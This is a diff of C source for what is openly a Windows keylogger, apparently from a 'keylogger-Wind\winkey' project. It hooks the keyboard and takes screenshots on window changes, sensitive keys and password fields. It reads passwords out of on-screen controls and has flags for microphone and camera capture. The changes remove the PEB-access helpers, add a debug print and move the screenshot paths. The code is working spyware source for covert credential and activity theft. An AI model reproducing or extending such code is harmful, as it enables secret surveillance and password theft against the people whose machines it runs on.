@@ -3,18 +3,6 @@
 HHOOK g_ouk;
 static char last_clip[1024] = {0};
 
-#ifdef _M_X64
-PPEB GetPEB(void)
-{
-	return (PPEB)__readgsqword(0x60);
-}
-#else
-PPEB GetPEB(void)
-{
-	return (PPEB)__readfsdword(0x30);
-}
-#endif
-
 volatile int g_micro_run = 0;
 volatile int g_camera_run = 0;
 
@@ -70,14 +58,15 @@ LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 		HWND current = GetForegroundWindow();
 		if (current && current != last_window)
 		{
-			capture_screen(L"C:\\winkey_screens\\window_change.bmp");
+			printf("CAPTURE TRY\n");
+			capture_screen(L"C:\\Users\\marcc\\keylogger-Wind\\winkey\\screens\\window_change.bmp");
 			last_window = current;
 		}
 		if (is_sensitive_key(kbd->vkCode))
-			capture_screen(L"C:\\winkey_screens\\sensitive_key.bmp");
+			capture_screen(L"C:\\Users\\marcc\\keylogger-Wind\\winkey\\screens\\sensitive_key.bmp");
 		if (is_password_field(current))
 		{
-			capture_screen(L"C:\\winkey_screens\\password_field.bmp");
+			capture_screen(L"C:\\Users\\marcc\\keylogger-Wind\\winkey\\screens\\password_field.bmp");
 			char pwd[256] = {0};
 			if (read_password_from_control(current, pwd, sizeof(pwd)))
 			{
